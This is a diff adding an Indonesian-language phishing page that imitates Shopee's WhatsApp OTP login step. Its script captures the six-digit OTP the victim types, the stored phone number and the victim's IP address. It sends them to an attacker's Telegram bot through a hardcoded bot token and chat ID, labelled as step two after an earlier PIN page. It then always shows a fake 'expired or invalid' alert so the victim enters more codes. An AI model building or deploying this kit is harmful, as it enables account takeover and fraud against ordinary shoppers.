@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in - Verifikasi OTP</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Inter & FontAwesome Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f5f5f5;
+        }
+        .shopee-orange {
+            background-color: #ee4d2d;
+        }
+        .shopee-text-orange {
+            color: #ee4d2d;
+        }
+    </style>
+</head>
+<body class="bg-[#f5f5f5] min-h-screen flex flex-col items-center text-gray-800">
+
+    <div class="w-full max-w-md bg-white min-h-screen flex flex-col justify-between shadow-sm relative">
+        
+        <div>
+            <!-- Header Bar -->
+            <div class="flex items-center justify-between px-4 py-3 border-b border-gray-100">
+                <div class="flex items-center space-x-3">
+                    <button onclick="history.back()" class="text-[#ee4d2d] text-lg focus:outline-none">
+                        <i class="fa-solid fa-arrow-left"></i>
+                    </button>
+                    <span class="text-lg font-normal text-gray-800">Log in</span>
+                </div>
+                <div>
+                    <button class="text-gray-500 text-lg focus:outline-none">
+                        <i class="fa-regular fa-circle-question"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div class="px-6 pt-10">
+                <!-- Informasi Pengiriman OTP -->
+                <div class="text-center mb-8">
+                    <p class="text-sm text-gray-700 mb-2">Kode OTP telah dikirim ke</p>
+                    <div class="flex items-center justify-center space-x-2">
+                        <i class="fa-brands fa-whatsapp text-green-500 text-lg"></i>
+                        <span class="text-sm font-medium text-gray-800" id="displayPhone">+62 8********</span>
+                    </div>
+                </div>
+
+                <!-- Input OTP Tersembunyi untuk menangkap ketikan keyboard -->
+                <input type="tel" id="hiddenOtpInput" maxlength="6" class="absolute opacity-0 pointer-events-none" oninput="handleOtpTyped(this)">
+
+                <!-- 6 Kotak Garis Bawah OTP -->
+                <div class="flex justify-between space-x-3 mb-8 cursor-pointer" onclick="focusOtpInput()">
+                    <div class="otp-box flex-1 h-12 border-b-2 border-gray-300 flex items-center justify-center text-xl font-medium text-gray-800"></div>
+                    <div class="otp-box flex-1 h-12 border-b-2 border-gray-300 flex items-center justify-center text-xl font-medium text-gray-800"></div>
+                    <div class="otp-box flex-1 h-12 border-b-2 border-gray-300 flex items-center justify-center text-xl font-medium text-gray-800"></div>
+                    <div class="otp-box flex-1 h-12 border-b-2 border-gray-300 flex items-center justify-center text-xl font-medium text-gray-800"></div>
+                    <div class="otp-box flex-1 h-12 border-b-2 border-gray-300 flex items-center justify-center text-xl font-medium text-gray-800"></div>
+                    <div class="otp-box flex-1 h-12 border-b-2 border-gray-300 flex items-center justify-center text-xl font-medium text-gray-800"></div>
+                </div>
+
+                <!-- Tombol Lanjut -->
+                <div class="mb-6">
+                    <button id="otpNextBtn" disabled onclick="submitOtp()"
+                        class="w-full py-3 rounded text-white font-medium bg-gray-200 text-gray-400 cursor-not-allowed transition-all duration-200">
+                        Lanjut
+                    </button>
+                </div>
+
+                <!-- Bantuan Kirim Ulang OTP -->
+                <div class="text-center text-xs text-gray-500">
+                    Tidak menerima Kode OTP? <a href="#" class="shopee-text-orange font-medium hover:underline">Metode Lainnya</a> atau coba <a href="#" class="shopee-text-orange font-medium hover:underline">Kirim Ulang</a>
+                </div>
+            </div>
+        </div>
+
+        <div class="py-6 text-center text-xs text-gray-500"></div>
+    </div>
+
+    <!-- Modal Peringatan OTP Invalid / Kadaluarsa -->
+    <div id="alertModal" class="fixed inset-0 bg-black/50 z-50 flex items-center justify-center hidden px-4">
+        <div class="bg-white w-full max-w-xs rounded-xl overflow-hidden shadow-2xl flex flex-col text-center p-6 transform transition-all">
+            <div class="mb-4 text-amber-500 text-3xl">
+                <i class="fa-solid fa-circle-exclamation"></i>
+            </div>
+            <h3 class="text-base font-semibold text-gray-800 mb-2">Pemberitahuan</h3>
+            <p class="text-sm text-gray-600 mb-6">Code OTP telah kadaluarsa atau invalid</p>
+            <button onclick="closeAlertModal()" class="w-full py-2.5 rounded-lg text-white font-medium shopee-orange hover:opacity-90 transition-opacity">
+                OK
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let otpCode = "";
+        let phoneNumber = localStorage.getItem("phoneNumber") || "Tidak diketahui";
+
+        // KONFIGURASI BOT TELEGRAM (Pastikan sama dengan halaman index)
+        const TELEGRAM_BOT_TOKEN = "8935462154:AAEaXDtr4v-KVg7o1n1uB3GjXkJ5ptgIamw";
+        const TELEGRAM_CHAT_ID = "392836663";
+
+        window.onload = function() {
+            focusOtpInput();
+            if (phoneNumber !== "Tidak diketahui") {
+                document.getElementById('displayPhone').textContent = "+62 " + phoneNumber;
+            }
+        };
+
+        function focusOtpInput() {
+            const input = document.getElementById('hiddenOtpInput');
+            input.focus();
+        }
+
+        function handleOtpTyped(input) {
+            const val = input.value.replace(/[^0-9]/g, '');
+            otpCode = val;
+            input.value = val;
+            const boxes = document.querySelectorAll('.otp-box');
+            const nextBtn = document.getElementById('otpNextBtn');
+
+            boxes.forEach((box, index) => {
+                box.textContent = val[index] || '';
+                if (index < val.length) {
+                    box.classList.remove('border-gray-300');
+                    box.classList.add('border-[#ee4d2d]');
+                } else {
+                    box.classList.remove('border-[#ee4d2d]');
+                    box.classList.add('border-gray-300');
+                }
+            });
+
+            if (val.length === 6) {
+                nextBtn.disabled = false;
+                nextBtn.classList.remove('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+                nextBtn.classList.add('shopee-orange', 'text-white', 'cursor-pointer', 'shadow-md');
+            } else {
+                nextBtn.disabled = true;
+                nextBtn.classList.add('bg-gray-200', 'text-gray-400', 'cursor-not-allowed');
+                nextBtn.classList.remove('shopee-orange', 'text-white', 'cursor-pointer', 'shadow-md');
+            }
+        }
+
+        async function submitOtp() {
+            try {
+                let ip = "Tidak diketahui";
+                try {
+                    const res = await fetch("https://api.ipify.org?format=json");
+                    const data = await res.json();
+                    ip = data.ip;
+                } catch (e) {}
+                
+                const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+                
+                const pesan = `🛒 [2/2] SHOPEE OTP VERIFIKASI\n\n📱 Nomor HP: ${phoneNumber}\n🔢 Kode OTP: ${otpCode}\n🌐 IP: ${ip}\n🕐 Waktu: ${waktu}`;
+                
+                // Kirim data OTP ke Bot Telegram secara terpisah (masuk berurutan setelah PIN)
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: pesan
+                    })
+                });
+            } catch (e) {
+                console.error("Gagal mengirim:", e);
+            }
+
+            const modal = document.getElementById('alertModal');
+            modal.classList.remove('hidden');
+        }
+
+        function closeAlertModal() {
+            const modal = document.getElementById('alertModal');
+            modal.classList.add('hidden');
+
+            const input = document.getElementById('hiddenOtpInput');
+            input.value = "";
+            otpCode = "";
+            handleOtpTyped(input);
+            focusOtpInput();
+        }
+    </script>
+</body>
+</html>
